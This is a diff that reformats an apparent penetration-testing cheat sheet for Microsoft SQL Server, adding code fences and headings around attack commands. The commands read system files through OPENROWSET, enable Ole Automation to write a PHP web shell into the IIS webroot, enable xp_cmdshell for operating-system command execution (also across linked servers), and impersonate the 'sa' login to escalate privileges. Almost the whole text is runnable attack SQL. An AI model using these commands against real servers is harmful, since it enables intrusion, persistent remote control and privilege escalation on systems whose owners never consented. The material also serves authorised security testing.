@@ -56,13 +56,16 @@ SELECT name FROM master..sysdatabases;
 # show tables ;
 USE <DATABASE> ;
 SELECT name FROM sys.tables;
+```
 
----
+## Read Files
 
-### Read Files
+```sql
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+```
+## Write Files (to achieve command execution)
 
-### Write Files (to achieve command execution)
+```sql
 sp_configure 'show advanced options', 1
 RECONFIGURE
 sp_configure 'Ole Automation Procedures', 1
@@ -75,19 +78,29 @@ EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\websh
 EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
 EXECUTE sp_OADestroy @FileID
 EXECUTE sp_OADestroy @OLE
+```
 
-### Enable xp_cmdshell
+## Enable xp_cmdshell
+
+- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
+
+```sql
+enable_xp_cmdshell
+
 EXECUTE sp_configure 'show advanced options', 1
 RECONFIGURE
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
 
-xp_cmdshell 'whoami'
+xp_cmdshell <COMMAND>
 
 # or run linked server command
 EXECUTE('xp_cmdshell ''<DOS_CMD>''') AT [<LINKED_SERVER>]
+```
 
-### Impersonate User
+## Impersonate User
+
+```sql
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
 GO
 
@@ -98,8 +111,11 @@ EXECUTE AS LOGIN = 'sa'
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 # 0 is NOT admin
+```
 
-### Linked Servers
+## Linked Servers
+
+```sql
 SELECT srvname, isremote FROM sysservers
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>\SQLEXPRESS]
 
